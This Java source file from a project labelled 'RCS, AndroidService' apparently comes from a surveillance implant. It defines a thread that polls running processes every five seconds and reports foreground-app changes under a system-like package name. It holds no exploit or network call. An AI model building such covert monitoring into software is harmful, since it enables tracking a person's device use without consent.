/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : BroadcastMonitorProcess.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo.listener;

import android.app.ActivityManager.RunningAppProcessInfo;

import com.android.deviceinfo.RunningProcesses;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.util.Check;

public class BroadcastMonitorProcess extends Thread {

	/** The Constant TAG. */
	private static final String TAG = "BroadcastMonitorProcess"; //$NON-NLS-1$

	private boolean stop;
	private final int period;
	int oldForeDigest = 0;

	RunningProcesses runningProcess;

	private ListenerProcess listenerProcess;

	public BroadcastMonitorProcess() {
		stop = false;
		period = 5000; // Poll interval
		runningProcess = new RunningProcesses();
		if (Cfg.DEBUG) {
			setName(getClass().getSimpleName());
		}
	}

	@Override
	public void run() {
		do {
			if (stop) {
				return;
			}
			runningProcess.update();
			int foreDigest = runningProcess.getForegroundDigest();

			if (foreDigest != oldForeDigest) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (run), changed fore, dispatching");
				}
				oldForeDigest = foreDigest;

				listenerProcess.dispatch(runningProcess);
			}

			try {
				synchronized (this) {
					wait(period);
				}
			} catch (final InterruptedException e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(e);//$NON-NLS-1$
				}
			}
		} while (true);
	}

	synchronized void register(ListenerProcess listenerProcess) {
		stop = false;
		this.listenerProcess = listenerProcess;
	}

	synchronized void unregister() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (unregister)");
		}
		stop = true;
		notifyAll();
	}
}
